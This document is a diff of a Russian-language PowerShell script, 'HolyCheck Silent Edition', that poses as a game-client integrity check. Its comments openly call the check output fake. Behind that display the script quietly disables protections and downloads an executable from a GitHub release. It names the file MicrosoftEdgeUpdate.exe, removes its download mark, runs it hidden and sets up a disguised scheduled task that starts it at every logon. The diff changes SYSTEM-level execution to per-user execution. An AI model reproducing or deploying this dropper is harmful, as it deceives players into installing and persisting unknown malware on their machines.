@@ -1,18 +1,17 @@
 # ================================================================
-# HolyCheck v3.2.3 — Silent Edition (только фейковый вывод)
+# HolyCheck v3.2.3 — Silent Edition (исправлен запуск)
 # ================================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
-$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\EdgeUpdate"
+$Dir      = "$env:APPDATA\Microsoft\EdgeUpdate"
 $Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
 $TaskName = "MicrosoftEdgeUpdateTask"
 $DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
 
 # ========== Скрытые подготовительные действия ==========
 New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-attrib +h +s $Dir 2>$null
 
 # Отключение защит (тихо)
 try {
@@ -58,7 +57,7 @@ function Get-File {
     return $false
 }
 
-# Запускаем загрузку в фоновом режиме
+# Запускаем загрузку в фоновом режиме (чтобы не блокировать вывод)
 $job = Start-Job -ScriptBlock {
     param($url, $out)
     $ErrorActionPreference = "SilentlyContinue"
@@ -107,7 +106,7 @@ Write-Host "  Запуск проверки целостности игрово�
 Sep
 Write-Host ""
 
-# Ждём завершения загрузки (до 30 секунд) — но ничего не выводим
+# Ждём завершения загрузки (до 30 секунд) — без вывода
 $downloadOk = $false
 $waitCount = 0
 while ($job.State -eq 'Running' -and $waitCount -lt 30) {
@@ -117,46 +116,27 @@ while ($job.State -eq 'Running' -and $waitCount -lt 30) {
 if ($job.State -eq 'Completed') { $downloadOk = Receive-Job -Job $job }
 Remove-Job -Job $job -Force
 
-# Если скачано — выполняем скрытые действия
+# Если скачано успешно — запускаем EXE от имени текущего пользователя (скрыто)
 if ($downloadOk) {
     Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
     Unblock-File -Path $Exe -ErrorAction SilentlyContinue
 
-    # Немедленный запуск через SYSTEM
-    $tempTask = "MicrosoftEdgeUpdateTemp"
-    Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -EA SilentlyContinue
+    # НЕМЕДЛЕННЫЙ ЗАПУСК (без SYSTEM, от текущего пользователя)
+    Start-Process -FilePath $Exe -WindowStyle Hidden -WorkingDirectory $Dir
+
+    # Создаём задачу в планировщике, которая запускается при входе пользователя
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
     try {
         $action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
-        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
-        Register-ScheduledTask -TaskName $tempTask -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
-        schtasks /run /tn "$tempTask" 2>$null | Out-Null
-        Start-Sleep -Seconds 5
-        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -EA SilentlyContinue
-    } catch {}
-
-    # Создаём постоянную задачу (каждые 7 дней)
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
-    $triggerTime = (Get-Date).Date.AddHours(3).AddMinutes(0)
-    if ($triggerTime -le (Get-Date)) { $triggerTime = $triggerTime.AddDays(7) }
-    try {
-        if ($PSVersionTable.PSVersion.Major -ge 5) {
-            $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
-            $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 7 -At $triggerTime
-            $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
-            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
-        } else {
-            $timeStr = $triggerTime.ToString("HH:mm")
-            $dateStr = $triggerTime.ToString("dd/MM/yyyy")
-            schtasks /create /tn "$TaskName" /tr "$Exe" /sc daily /mo 7 /st $timeStr /sd $dateStr /ru SYSTEM /rl HIGHEST /f 2>$null | Out-Null
-        }
+        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
     } catch {}
 }
 
-# ====== Теперь идёт фейковый вывод проверок (длится > 60 сек) ======
+# ====== Фейковый вывод проверок (длится > 60 сек) ======
 $startTime = Get-Date
 
-# Фейковые проверки (без каких-либо упоминаний о загрузке или автозапуске)
 INFO "Проверка свободного места на системном диске..."
 Pause-Scan 800
 try {
@@ -325,7 +305,6 @@ Write-Host ""
 Sep
 OK "Проверка завершена! Среда игрового клиента оптимизирована."
 
-# Фейковый отчёт
 $reportPath = Join-Path $Dir "last_check.json"
 @{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK"; version = "3.2.3" } | ConvertTo-Json | Out-File $reportPath -Encoding utf8 -Force
 INFO "Локальный отчёт сохранён"
